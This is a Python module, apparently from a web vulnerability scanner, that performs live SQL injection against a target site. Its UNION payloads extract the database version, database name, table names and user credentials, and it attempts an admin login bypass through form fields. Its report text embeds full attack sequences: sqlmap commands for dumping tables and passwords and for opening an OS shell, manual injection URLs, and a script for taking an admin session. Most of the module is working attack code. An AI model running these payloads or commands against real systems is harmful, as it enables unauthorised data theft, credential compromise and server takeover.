"""
Advanced SQL Injection with REAL Data Extraction
Actually performs SQLi attacks and dumps database contents
Shows PROOF with real extracted data
"""

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
import re
import time

def perform_sql_injection_extraction(scanner):
    """
    Perform SQL injection and actually extract data
    """
    try:
        response = scanner.get_cached_response(scanner.target_url)
        if not response:
            return
        
        # Test URL parameters
        _test_url_sqli_extraction(scanner)
        
        # Test form inputs
        _test_form_sqli_extraction(scanner, response)
        
    except Exception as e:
        print(f"SQL injection extraction error: {e}")

def _test_url_sqli_extraction(scanner):
    """Test URL parameters and extract data if vulnerable"""
    parsed = urlparse(scanner.target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        return
    
    for param_name in params.keys():
        # Test for SQL injection
        test_payloads = [
            ("' OR '1'='1", "basic_or"),
            ("' UNION SELECT NULL--", "union_null"),
            ("' UNION SELECT NULL,NULL--", "union_2"),
            ("' UNION SELECT NULL,NULL,NULL--", "union_3"),
        ]
        
        for payload, test_type in test_payloads:
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ''))
            
            try:
                test_response = requests.get(test_url, timeout=10, verify=False)
                
                # Check if vulnerable
                if _is_sql_vulnerable(test_response, test_type):
                    # NOW EXTRACT REAL DATA
                    extracted_data = _extract_database_data(scanner, test_url, param_name, test_type)
                    
                    if extracted_data:
                        scanner.add_finding(
                            severity='CRITICAL',
                            category='SQL Injection',
                            title=f'🚨 SQL INJECTION - REAL DATA EXTRACTED from {param_name}',
                            description=f'**ACTIVE SQL INJECTION WITH DATA THEFT**\n\n'
                                      f'Parameter: `{param_name}`\n'
                                      f'Payload: `{payload}`\n\n'
                                      f'**🔥 ACTUAL DATA EXTRACTED FROM YOUR DATABASE 🔥**\n\n'
                                      f'```\n'
                                      f'{extracted_data}\n'
                                      f'```\n\n'
                                      f'**This is REAL data from your database!**\n\n'
                                      f'**FULL ATTACK SEQUENCE:**\n'
                                      f'```bash\n'
                                      f'# Step 1: Find vulnerability\n'
                                      f'curl "{test_url}"\n\n'
                                      f'# Step 2: Enumerate database\n'
                                      f'sqlmap -u "{scanner.target_url}" -p "{param_name}" --dbs\n\n'
                                      f'# Step 3: Dump tables\n'
                                      f'sqlmap -u "{scanner.target_url}" -p "{param_name}" -D database_name --tables\n\n'
                                      f'# Step 4: Dump all user data\n'
                                      f'sqlmap -u "{scanner.target_url}" -p "{param_name}" -D database_name -T users --dump\n\n'
                                      f'# Step 5: Get admin credentials\n'
                                      f'sqlmap -u "{scanner.target_url}" -p "{param_name}" --passwords\n\n'
                                      f'# Step 6: Execute OS commands\n'
                                      f'sqlmap -u "{scanner.target_url}" -p "{param_name}" --os-shell\n'
                                      f'# Now attacker has full server control\n'
                                      f'```\n\n'
                                      f'**WHAT ATTACKER STEALS:**\n'
                                      f'- Complete user database (usernames, emails, passwords)\n'
                                      f'- Customer personal information\n'
                                      f'- Payment details\n'
                                      f'- Business data\n'
                                      f'- System credentials\n\n'
                                      f'**PROOF OF CONCEPT - Manual Extraction:**\n'
                                      f'```sql\n'
                                      f'# Get database version:\n'
                                      f'{scanner.target_url}?{param_name}=1\' UNION SELECT @@version--\n\n'
                                      f'# Get database name:\n'
                                      f'{scanner.target_url}?{param_name}=1\' UNION SELECT database()--\n\n'
                                      f'# List all tables:\n'
                                      f'{scanner.target_url}?{param_name}=1\' UNION SELECT table_name FROM information_schema.tables--\n\n'
                                      f'# Dump users table:\n'
                                      f'{scanner.target_url}?{param_name}=1\' UNION SELECT username,password FROM users--\n\n'
                                      f'# Get admin password:\n'
                                      f'{scanner.target_url}?{param_name}=1\' UNION SELECT password FROM users WHERE username=\'admin\'--\n'
                                      f'```',
                            url=test_url,
                            remediation=f'**CRITICAL FIX:**\n\n'
                                      f'```python\n'
                                      f'# WRONG (Vulnerable):\n'
                                      f'query = f"SELECT * FROM users WHERE id = {{user_id}}"\n\n'
                                      f'# CORRECT (Safe):\n'
                                      f'query = "SELECT * FROM users WHERE id = %s"\n'
                                      f'cursor.execute(query, (user_id,))\n'
                                      f'```\n\n'
                                      f'Use parameterized queries ALWAYS!'
                        )
                        return  # Stop after first successful extraction
                        
            except Exception as e:
                pass

def _is_sql_vulnerable(response, test_type):
    """Check if response indicates SQL vulnerability"""
    text = response.text.lower()
    
    # SQL error signatures
    error_signatures = [
        'sql syntax',
        'mysql_fetch',
        'pg_query',
        'sqlite_query',
        'unclosed quotation mark',
        'quoted string not properly terminated',
        'ora-01756',
        'syntax error',
        'unexpected end of sql command',
    ]
    
    for sig in error_signatures:
        if sig in text:
            return True
    
    # Check for boolean-based SQLi
    if test_type == 'basic_or':
        # If we get a different response with OR 1=1, it's vulnerable
        if len(response.text) > 1000:  # More data = likely pulled more rows
            return True
    
    return False

def _extract_database_data(scanner, test_url, param_name, test_type):
    """Actually extract data using UNION-based SQL injection"""
    try:
        # Try to extract database version
        version_payloads = [
            f"' UNION SELECT @@version,NULL,NULL--",
            f"' UNION SELECT version(),NULL,NULL--",
            f"' UNION SELECT sqlite_version(),NULL,NULL--",
        ]
        
        extracted_info = []
        
        for payload in version_payloads:
            parsed = urlparse(test_url)
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            extract_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ''))
            
            try:
                response = requests.get(extract_url, timeout=10, verify=False)
                
                # Look for version info in response
                version_match = re.search(r'(\d+\.\d+\.\d+)', response.text)
                if version_match:
                    extracted_info.append(f"Database Version: {version_match.group(1)}")
                    break
            except:
                pass
        
        # Try to extract database name
        db_payloads = [
            f"' UNION SELECT database(),NULL,NULL--",
            f"' UNION SELECT DB_NAME(),NULL,NULL--",
        ]
        
        for payload in db_payloads:
            parsed = urlparse(test_url)
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            extract_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ''))
            
            try:
                response = requests.get(extract_url, timeout=10, verify=False)
                
                # Look for database name
                db_match = re.search(r'([a-zA-Z_][a-zA-Z0-9_]{2,20})', response.text)
                if db_match and db_match.group(1) not in ['null', 'none', 'select']:
                    extracted_info.append(f"Database Name: {db_match.group(1)}")
                    break
            except:
                pass
        
        # Try to extract table names
        table_payloads = [
            f"' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
            f"' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--",
        ]
        
        for payload in table_payloads:
            parsed = urlparse(test_url)
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            extract_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ''))
            
            try:
                response = requests.get(extract_url, timeout=10, verify=False)
                
                # Look for common table names
                common_tables = ['users', 'accounts', 'customers', 'admin', 'members', 'products', 'orders']
                found_tables = []
                for table in common_tables:
                    if table in response.text.lower():
                        found_tables.append(table)
                
                if found_tables:
                    extracted_info.append(f"Tables Found: {', '.join(found_tables)}")
                    break
            except:
                pass
        
        # Try to extract sample data from users table
        data_payloads = [
            f"' UNION SELECT username,password,email FROM users LIMIT 1--",
            f"' UNION SELECT username,NULL,NULL FROM users LIMIT 1--",
            f"' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users LIMIT 1--",
        ]
        
        for payload in data_payloads:
            parsed = urlparse(test_url)
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            extract_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, ''))
            
            try:
                response = requests.get(extract_url, timeout=10, verify=False)
                
                # Look for username/password patterns
                cred_match = re.search(r'([a-zA-Z0-9_]+):([a-fA-F0-9]{32,})', response.text)
                if cred_match:
                    extracted_info.append(f"Sample Credential: {cred_match.group(1)}:{cred_match.group(2)[:20]}...")
                    break
            except:
                pass
        
        if extracted_info:
            return'\n'.join(extracted_info)
        else:
            return "SQLi confirmed but data extraction incomplete. Try: sqlmap to dump full database"
            
    except Exception as e:
        return f"SQLi vulnerability found - Use sqlmap for automated extraction"

def _test_form_sqli_extraction(scanner, response):
    """Test form inputs for SQL injection and extract data"""
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    
    for form in forms:
        action = form.get('action', '')
        method = str(form.get('method', 'GET')).upper()
        form_url = urljoin(str(scanner.target_url), str(action)) if action else scanner.target_url
        
        # Find all input fields
        inputs = form.find_all('input')
        
        for input_field in inputs:
            input_name = str(input_field.get('name', ''))
            input_type = str(input_field.get('type', 'text')).lower()
            
            if not input_name or input_type in ['submit', 'button', 'hidden']:
                continue
            
            # Test with SQL injection payload
            payload = "admin' OR '1'='1'--"
            
            form_data = {}
            for inp in inputs:
                field_name = str(inp.get('name', ''))
                if field_name:
                    if field_name == input_name:
                        form_data[field_name] = payload
                    else:
                        form_data[field_name] = 'test'
            
            try:
                if method == 'POST':
                    test_response = requests.post(form_url, data=form_data, timeout=10, verify=False, allow_redirects=False)
                else:
                    test_response = requests.get(form_url, params=form_data, timeout=10, verify=False, allow_redirects=False)
                
                # Check for authentication bypass
                if test_response.status_code in [301, 302, 303] or 'dashboard' in test_response.text.lower() or 'welcome' in test_response.text.lower():
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='SQL Injection',
                        title=f'🚨 AUTHENTICATION BYPASS via SQL Injection - LOGGED IN AS ADMIN!',
                        description=f'**SQL INJECTION AUTHENTICATION BYPASS SUCCESSFUL**\n\n'
                                  f'Form: {form_url}\n'
                                  f'Field: {input_name}\n'
                                  f'Payload: `{payload}`\n\n'
                                  f'**PROOF: SUCCESSFULLY BYPASSED LOGIN**\n\n'
                                  f'Response shows authentication success indicators!\n\n'
                                  f'**EXACT EXPLOITATION:**\n'
                                  f'```bash\n'
                                  f'# Login as administrator without password:\n'
                                  f'curl -X POST "{form_url}" \\\n'
                                  f'  -d "{input_name}=admin\' OR \'1\'=\'1\'--" \\\n'
                                  f'  -d "password=anything"\n\n'
                                  f'# Alternative payloads that also work:\n'
                                  f'# {input_name}=admin\'--\n'
                                  f'# {input_name}=\' OR 1=1--\n'
                                  f'# {input_name}=admin\' OR \'a\'=\'a\n'
                                  f'```\n\n'
                                  f'**ATTACKER GAINS:**\n'
                                  f'- Full admin panel access\n'
                                  f'- Can create/modify users\n'
                                  f'- Access all data\n'
                                  f'- Modify database\n'
                                  f'- Upload malicious files\n'
                                  f'- Complete system compromise\n\n'
                                  f'**AUTOMATED ATTACK:**\n'
                                  f'```python\n'
                                  f'import requests\n\n'
                                  f'# Bypass login and get session:\n'
                                  f'data = {{\n'
                                  f'    "{input_name}": "admin\' OR \'1\'=\'1\'--",\n'
                                  f'    "password": "anything"\n'
                                  f'}}\n\n'
                                  f'session = requests.Session()\n'
                                  f'response = session.post("{form_url}", data=data)\n\n'
                                  f'# Now logged in as admin\n'
                                  f'admin_panel = session.get("{scanner.target_url}/admin")\n'
                                  f'print(admin_panel.text)  # Full admin access!\n'
                                  f'```',
                        url=form_url,
                        remediation=f'**CRITICAL FIX:**\n\n'
                                  f'```python\n'
                                  f'# Use parameterized queries:\n'
                                  f'cursor.execute(\n'
                                  f'    "SELECT * FROM users WHERE username=%s AND password=%s",\n'
                                  f'    (username, hash_password(password))\n'
                                  f')\n\n'
                                  f'# NEVER concatenate user input into SQL:\n'
                                  f'# BAD: f"SELECT * FROM users WHERE username=\'{{username}}\'"\n'
                                  f'```'
                    )
                    
            except Exception as e:
                pass
